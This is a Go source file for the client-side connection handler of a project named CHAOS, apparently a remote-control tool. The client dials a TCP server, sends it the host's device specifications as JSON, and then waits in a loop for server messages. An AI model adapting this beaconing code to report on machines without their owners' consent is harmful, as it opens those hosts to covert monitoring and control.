package connection

import (
	"bufio"
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"net"
)

var Delimiter string = "\n"

type ConnectionHandler struct {
	Connection net.Conn
}

func NewConnectionHandler(address, port string) handler.Handler {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.Fatal(err)
	}

	return &ConnectionHandler{
		Connection: conn,
	}
}

func (c ConnectionHandler) Handle() error {
	device, err := encode(util.LoadDeviceSpecs())
	if err != nil {
		log.WithField("cause", err.Error()).Error("error encoding device specs")
		return err
	}
	if err := c.Write(string(device)); err != nil {
		log.WithField("cause", err.Error()).Error("error writing device specs")
		return err
	}

	for {
		message, _ := bufio.NewReader(c.Connection).ReadString('\n')
		fmt.Print("Message from server: " + message)
	}
}

func (c ConnectionHandler) Write(v string) error {
	_, err := c.Connection.Write([]byte(v + Delimiter))
	return err
}

func encode(device *models.Device) ([]byte, error) {
	spec, err := json.Marshal(device)
	if err != nil {
		return nil, err
	}
	return spec, nil
}
